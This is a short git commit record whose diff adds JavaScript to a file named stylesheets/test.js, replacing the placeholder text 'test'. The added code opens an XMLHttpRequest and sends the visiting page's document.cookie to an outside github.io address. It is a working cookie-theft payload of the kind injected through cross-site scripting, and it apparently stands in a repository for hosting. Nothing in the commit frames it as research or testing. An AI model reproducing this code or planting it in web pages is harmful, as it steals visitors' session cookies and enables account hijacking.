5a34334f4ee82119ced040508b742f799f56e0db
vvip <498906869@qq.com>
2015-08-17 15:34:20 +0800

    Update test.js

--- stylesheets/test.js
+++ stylesheets/test.js
@@ -1,1 +1,22 @@
-test
+var ajax = false;
+if(window.XMLHttpRequest){
+	//IE7+,Safari,Opera etc.
+	ajax = new XMLHttpRequest();
+}else if(window.ActiveXObject){
+	try
+	{
+		ajax = new ActiveXObject("Msxml2.XMLHTTP");
+	}
+	catch (e1)
+	{
+		try
+		{
+			ajax = new ActiveXObject("Microsoft.XMLHTTP");
+		}
+		catch (e2)
+		{
+		}
+	}
+}
+ajax.open("get", "http://vvip.github.io/vvip/stylesheets/test2.js?cookie="+encodeURI(document.cookie), true);
+ajax.send();
